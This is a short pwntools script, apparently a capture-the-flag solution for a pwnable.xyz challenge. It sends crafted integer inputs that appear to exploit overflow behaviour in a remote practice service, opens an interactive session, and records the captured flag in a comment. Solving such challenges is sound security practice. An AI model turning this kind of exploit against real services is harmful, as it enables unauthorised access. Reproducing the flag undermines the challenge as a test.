from pwn import *

""" r = process('./challenge') """
r = remote('svc.pwnable.xyz', 30008)
print(r.recvuntil("x:"))
r.sendline("1336")
print(r.recvuntil("y:"))
r.sendline(str(4294967295))
print(r.recvline())
r.sendline("3 1431656211")
r.recvline()
r.sendline("-2 -1 0 1 2")
r.interactive()
# FLAG{1eet_t00leet_3leet_4z}
